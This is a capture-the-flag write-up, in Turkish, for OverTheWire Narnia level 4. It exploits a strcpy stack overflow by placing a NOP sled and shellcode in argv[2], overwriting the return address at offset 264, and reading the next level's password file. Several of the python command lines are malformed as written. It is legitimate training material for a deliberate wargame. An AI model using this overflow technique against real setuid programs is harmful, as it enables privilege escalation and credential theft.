# OverTheWire — Narnia Level 4 → 5

> Hedef: `narnia4`'ten `narnia5` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: `strcpy` overflow → EIP; `environ` siliniyor → shellcode'u **`argv[2]`'ye** koy.

---

## 1. Bağlantı
```bash
ssh narnia4@narnia.labs.overthewire.org -p 2226
```

## 2. Kaynak
```c
extern char **environ;
int main(int argc,char **argv){
    int i; char buffer[256];
    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));   // TÜM env'i SIFIRLA
    if(argc>1) strcpy(buffer, argv[1]);                 // AÇIK: taşma
}
```

## 3. Zafiyet + kilit gözlem
`environ` silindiği için EGG'e shellcode koyamazsın. **AMA `argv` silinmiyor** → shellcode'u
`argv[2]`'ye koy. **Önemli:** env içeriğinin silinmesi stack ADRESLERİNİ değiştirmez (string'ler
yerinde, sadece sıfırlanmış) → adres bulan helper env silinse de geçerli.

## 4. Offset — disasm (**VERIFIED = 264**)
```
08049189:  sub  esp, 0x104           ; 260 byte frame
...
80491f2:   lea  eax, [ebp-0x104]     ; buffer = ebp-0x104 (256) ; i = ebp-0x4
80491f9:   call strcpy@plt
```
`buffer = ebp-0x104`, saved EIP `ebp+4` → mesafe `0x104 + 4 = **264**`.

## 5. argv[2] adresi
`argv[2]`'nin stack adresini, **aynı argv uzunluklarıyla** çalışan bir helper'la bul:
```c
int main(int c,char**v){ printf("ADDR=%p\n",(void*)v[2]); return 0; }   // 15-char path
```

## 6. Exploit
```bash
cd /tmp
ARGV2=$(python3 -c 'b"\x90"*20000 + SHELLCODE_57')         # sled + setreuid/execve
DUMMY=$(python3 -c 'b"A"*268')                             # argv[1] ile aynı uzunluk (264+4)
ADDR=$(/tmp/argvaddr12 "$DUMMY" "$ARGV2" | ...)            # argv[2] adresi (örn ffff877d)
RET=$((0x$ADDR + 10000))
# argv[1] = "A"*264 + RET ; argv[2] = sled+shellcode
# env SİLİNDİ -> spawn shell'de PATH yok -> MUTLAK yol: /bin/cat, /usr/bin/id
python3 -c 'timed: "/usr/bin/id; /bin/cat /etc/narnia_pass/narnia5"' | \
  /narnia/narnia4 "$(python3 -c "b'A'*264 + pack('<I', RET)")" "$ARGV2"
```
Çıktı: `ADDR=ffff877d RET=ffffae8d` → `uid=14005(narnia5)` → şifre. (İlk denemede tuttu.)

## 7. Doğrulama
`uid=14005(narnia5)` ✅

## Dersler
| Konu | Not |
|------|-----|
| env wipe | EGG kullanılamaz → shellcode `argv[2]`'ye (silinmez) |
| Offset 264 | `buffer=ebp-0x104` → 260+4 |
| adres = aynı | env içeriği silinse de stack adresleri değişmez → helper geçerli |
| PATH yok | env wipe sonrası shell'de **mutlak yol** (`/bin/cat`, `/usr/bin/id`) |

**narnia5 şifresi: `**********`**
